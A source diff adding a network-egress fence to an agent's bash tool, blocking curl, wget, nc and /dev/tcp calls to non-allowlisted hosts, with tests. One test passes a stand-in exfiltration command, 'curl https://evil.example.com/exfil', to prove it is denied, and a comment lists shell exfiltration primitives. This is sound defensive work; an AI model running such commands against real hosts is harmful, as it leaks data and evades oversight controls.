@@ -629,6 +629,25 @@ async fn execute_bash_tool(arguments: &serde_json::Value, mode: &ShellExecutionM
         return format!("bash.exec denied: {}", hardline.denial_message());
     }
 
+    // L1 network-egress fence: raw shell fetch/exfil primitives (curl, wget,
+    // nc, /dev/tcp, interpreter sockets) bypass the entire governed outbound
+    // fabric (binding authority, host allowlists, DNS pinning, the secret-ref
+    // credential boundary, the audit registry). Detection is compiled-in and
+    // config-free; the allow decision uses the shell egress policy — loopback
+    // and tailnet pass, an unresolvable or non-allowlisted host is denied and
+    // redirected to `http:<binding>.request`. See crates/exec-guard/net_egress.
+    if let Some(egress) = exec_guard::detect_network_egress(command) {
+        let policy = ansible_mesh_core::mcp_upstream::McpEgressPolicy::shell_egress_from_env();
+        let permitted = egress
+            .host
+            .as_deref()
+            .map(|host| policy.host_allowed(host))
+            .unwrap_or(false);
+        if !permitted {
+            return format!("bash.exec denied: {}", egress.denial_message());
+        }
+    }
+
     let working_dir = arguments.get("working_dir").and_then(|v| v.as_str());
     let timeout_secs = arguments
         .get("timeout_secs")
@@ -1254,6 +1273,48 @@ mod tests {
         assert!(
             !output.starts_with("bash.exec denied:"),
             "unexpected output: {output}"
+        );
+    }
+
+    // ── L1 network-egress fence (exec-guard::detect_network_egress) ─────────
+
+    #[tokio::test]
+    async fn bash_exec_egress_blocks_public_host_without_dialing_socket() {
+        // Same trick as the hardline sandboxed test: no listener is bound, so
+        // if the egress fence were bypassed this would surface a connection
+        // error instead of a clean denial — proving the check short-circuits
+        // before any executor runs. A public host is never loopback/tailnet.
+        let output = execute_bash_tool(
+            &json!({ "command": "curl https://evil.example.com/exfil" }),
+            &ShellExecutionMode::Sandboxed {
+                socket_path: "/nonexistent/exec-guard-egress-test.sock".to_string(),
+            },
+        )
+        .await;
+        assert!(
+            output.starts_with("bash.exec denied:"),
+            "unexpected output: {output}"
+        );
+        assert!(
+            output.contains("http:<binding>.request"),
+            "denial should redirect to the governed fabric: {output}"
+        );
+    }
+
+    #[tokio::test]
+    async fn bash_exec_egress_allows_loopback_through_the_fence() {
+        // Loopback is always permitted (AGENTS.md's own curl to 127.0.0.1
+        // must keep working). Nothing is listening on this port, so the
+        // command itself fails — the point is only that it is NOT denied by
+        // the fence (no "bash.exec denied:" prefix).
+        let output = execute_bash_tool(
+            &json!({ "command": "curl -s http://127.0.0.1:9/ ; true", "timeout_secs": 5 }),
+            &ShellExecutionMode::Direct,
+        )
+        .await;
+        assert!(
+            !output.starts_with("bash.exec denied:"),
+            "loopback egress must pass the fence: {output}"
         );
     }
 }
